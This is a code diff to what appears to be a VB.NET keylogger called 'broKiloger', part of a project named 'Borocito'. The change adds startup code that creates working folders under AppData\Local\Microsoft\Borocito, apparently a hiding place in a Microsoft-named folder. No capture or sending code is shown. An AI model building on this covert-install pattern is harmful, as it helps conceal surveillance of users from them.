@@ -2,6 +2,7 @@
 Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
+    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
     Public HttpOwnerServer As String
     Public alphabet As New ArrayList
 End Module
@@ -89,12 +90,25 @@ Module StartUp
     Sub Init()
         AddToLog("Init", "broKiloger " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
+            CommonActions()
             'Cargamos los datos del registro de Windows
             LoadRegedit()
             'Cargamos el alfabeto y numeros
             ApplyAlphabet()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub CommonActions()
+        Try
+            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
+                My.Computer.FileSystem.CreateDirectory(DIRCommons)
+            End If
+            If Not My.Computer.FileSystem.DirectoryExists(DIRHome) Then
+                My.Computer.FileSystem.CreateDirectory(DIRHome)
+            End If
+        Catch ex As Exception
+            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub ApplyAlphabet()
